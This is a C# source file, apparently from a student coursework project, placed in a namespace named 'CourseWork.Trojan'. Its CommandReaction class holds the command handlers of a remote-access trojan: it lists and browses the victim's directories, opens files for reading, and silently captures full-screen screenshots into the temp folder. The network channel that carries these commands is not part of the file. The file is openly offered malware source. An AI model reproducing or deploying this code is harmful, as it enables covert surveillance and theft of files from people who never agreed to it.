using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows;
using System.Windows.Media.Imaging;
using Point = System.Drawing.Point;
using Size = System.Drawing.Size;

namespace CourseWork.Trojan
{
    internal class CommandReaction
    {
        public string CurrentDirectory { get; private set; } = Environment.CurrentDirectory;

        public string[] GetDirectoryContent()
        {
            List<string> directoryContent = new List<string>();

            directoryContent.AddRange(Directory.GetFiles(CurrentDirectory));
            directoryContent.AddRange(Directory.GetDirectories(CurrentDirectory));

            for (int file = 0; file < directoryContent.Count; file++)
            {
                directoryContent[file] = CutPath(directoryContent[file]);
            }

            return directoryContent.ToArray();
        }

        public string GoToFolder(string folder)
        {
            string newPath = CurrentDirectory + "\\" + folder;

            if (Directory.Exists(newPath))
            {
                CurrentDirectory = newPath;
                return newPath;
            }

            return "Ошибка";
        }

        public string AboveDirectory()
        {
            string[] currentPath = CurrentDirectory.Split('\\');
            string newPath = "";

            for (int directory = 0; directory < currentPath.Length - 1; directory++)
            {
                if (directory != currentPath.Length - 2)
                {
                    newPath += currentPath[directory] + "\\";
                }
                else
                {
                    newPath += currentPath[directory];
                }
            }

            if (Directory.Exists(newPath))
            {
                CurrentDirectory = newPath;
                return newPath;
            }

            return "Ошибка";
        }

        public Stream ReadFile(string name)
        {
            return File.OpenRead(CurrentDirectory + "\\" + name);
        }

        public bool FindFileInCurrentDirectory(string file)
        {
            return File.Exists(CurrentDirectory + "\\" + file);
        }

        public string GetScreenshotPath()
        {
            Rectangle rect = new Rectangle(new Point(0, 0),
                new Size((int)SystemParameters.PrimaryScreenWidth, (int)SystemParameters.PrimaryScreenHeight));

            BitmapImageToBitmap(CaptureRect(rect, ImageFormat.Png)).Save(Path.GetTempPath() + "screen.jpg", ImageFormat.Jpeg);
            return Path.GetTempPath() + "screen.jpg";
        }

        private BitmapImage CaptureRect(Rectangle rect, ImageFormat format)
        {
            using (var ms = new MemoryStream())
            {
                using (Bitmap bitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppRgb))
                {
                    using (Graphics graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);
                    }
                    bitmap.Save(ms, format);
                }
                var image = new BitmapImage();
                image.BeginInit();
                image.CacheOption = BitmapCacheOption.OnLoad;
                image.StreamSource = ms;
                image.EndInit();
                return image;
            }
        }

        private Bitmap BitmapImageToBitmap(BitmapImage bitmapSource)
        {
            using (MemoryStream outstream = new MemoryStream())
            {
                BitmapEncoder enc = new PngBitmapEncoder();
                enc.Frames.Add(BitmapFrame.Create(bitmapSource));
                enc.Save(outstream);
                return new Bitmap(outstream);
            }
        }

        private string CutPath(string path)
        {
            string[] pathSplit = path.Split('\\');
            return pathSplit[pathSplit.Length - 1];
        }
    }
}
